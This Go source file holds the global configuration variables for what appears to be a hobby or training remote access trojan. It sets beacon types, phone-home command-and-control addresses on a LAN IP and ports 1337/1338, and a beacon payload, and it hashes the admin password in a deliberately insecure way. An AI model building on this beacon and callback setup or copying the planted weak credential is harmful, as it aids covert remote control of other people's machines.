/*/
This file contains the global variables we need to allow our functions to
share various things between them. Try to avoid having too many of these.
And limit thier scope/context within which you use them

Go language "thing" Called "exports":
	- To make something available from the module source, you have to capitalize it
/*/
package Core

// import the libraries we need
import (
	"crypto"
	"net"

	/*/  IMPORTING MODULES YOU FIND ONLINE
		in the terminal in VSCODE, while in the package root directory,
		append the following imports, as is, to the command "go get"

		Example:

		go get github.com/hashicorp/mdns

		And it will install the modules to the
		GOMODCACHE environment variable
	/*/
	// necessary for multicast DNS
	"github.com/hashicorp/mdns"
)

// THIS GETS SET BY ProjectManager.py
// defines what code is compiled into the final binary
var BUILD_TARGET_OS string = "linux"
var ZOMBIEFILENAME string = "rat.exe"

// variables for logs
var ZOMBIESLOGFILE string = "zombielegs.logs"
var COMMANDLOGFILE string = "comlog.slog"

// This gets set by the script that generates the binary
// for the target.
var BEACON_ON_START bool

//if BEACON_ON_START == true {
// can be one of four options, http, tcp, udp, dns
// Default is TCP callback
var BACON_TYPE string = "tcp"
var BEACONHTTPTYPE string = "get"

// payload to send for post request in BeaconHTTP() in file /src/beacons.go
var BEACONPOSTPAYLOAD string = "{'beacon_payload' : {'auth_string' : 'dont be a fool, pack your tool'}}"

//
// declaring global variables to share our
// network information between scopes
// these are for TCP/UDP specifically

// COMMAND AND CONTROL ADDRESSES
// WE ARE LOCAL, ZOMBIE IS REMOTE!
// these are set by the project manager script
// right now during development, they will waffle back and forth...
var ipstr string = "192.168.0.2"
var commandIP net.IP = net.ParseIP(ipstr)
var TCPPORT int = 1337
var UDPPORT int = 1338
var Local_tcpaddr_LAN net.TCPAddr = net.TCPAddr{IP: commandIP, Port: TCPPORT}
var Local_udpaddr_LAN net.UDPAddr = net.UDPAddr{IP: commandIP, Port: UDPPORT}
var Local_tcpaddr_WAN net.TCPAddr
var Local_udpaddr_WAN net.UDPAddr

var Remote_tcpport string //= ":1337"
var Remote_tcpaddr string //= "192.168.0.2" + Remote_tcpport
var Remote_udpport string //= ":1338"
var Remote_udpaddr string //= Remote_tcpaddr + Remote_udpport
var Remote_http_addr string = "http://127.0.0.1/rattest/"
var Remote_ftp_addr string
var Remote_dns_addr string

// just easier to remember, yeah I know, stop complaining
var PHONEHOME_TCP net.TCPAddr = Local_tcpaddr_LAN
var PHONEHOME_UDP net.UDPAddr = Local_udpaddr_LAN

//-----NAME-------------TYPE-----
var Mega_important_encryption_key string

// Admin Password in an obvious place
// TODO: set these for "hardmode" section
var Sha256_admin_pass_preencrypted crypto.Hash
var Sha512_admin_pass_preencrypted crypto.Hash

// Horribly insecure implementation
var Sha256_hash_admin crypto.Hash
var New_admin_hash = Sha256_hash_admin.New()
var Wat = New_admin_hash.Sum([]byte("admin"))

// multi-cast DNS Server. for LAN communication
var Mdns_server mdns.Server
